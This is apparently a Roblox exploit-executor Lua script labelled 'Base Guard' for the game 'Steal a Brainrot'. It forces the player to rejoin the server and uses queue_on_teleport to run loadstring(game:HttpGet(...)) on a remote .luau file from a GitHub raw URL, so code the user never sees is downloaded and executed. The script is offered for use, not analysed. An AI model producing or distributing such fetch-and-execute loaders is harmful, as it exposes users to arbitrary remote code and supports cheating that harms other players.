--// Steal a Brainrot - Base Guard
--// Force rejoin → wait for GUI → run script

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer
local PlaceId = game.PlaceId
local JobId = game.JobId

--// ═══════════════════════════════════════════
--// STEP 1: QUEUE RE-EXECUTION AFTER REJOIN
--// ═══════════════════════════════════════════

local LOAD_URL = "https://raw.githubusercontent.com/deebee003/laughing-giggle/refs/heads/main/a.luau"

if queue_on_teleport then
    -- Queue the full script to run after the rejoin completes
    queue_on_teleport([[
        -- Wait for player GUI to fully load
        local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui", 30)
        if playerGui then
            -- Wait for StarterGui to be ready
            game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
            repeat task.wait(0.5) until playerGui:FindFirstChildOfClass("ScreenGui") or task.wait(10)
            -- Extra safety wait
            task.wait(3)
        end
        -- Now run the full script
        loadstring(game:HttpGet("]] .. LOAD_URL .. [[", true))()
    ]])
    print("[Base Guard] Queued re-execution after rejoin")
end

--// ═══════════════════════════════════════════
--// STEP 2: FORCE REJOIN
--// ═══════════════════════════════════════════

print("[Base Guard] Rejoining server...")
pcall(function()
    TeleportService:TeleportToPlaceInstance(PlaceId, JobId, LocalPlayer)
end)

-- Fallback rejoin method
pcall(function()
    TeleportService:Teleport(PlaceId)
end)
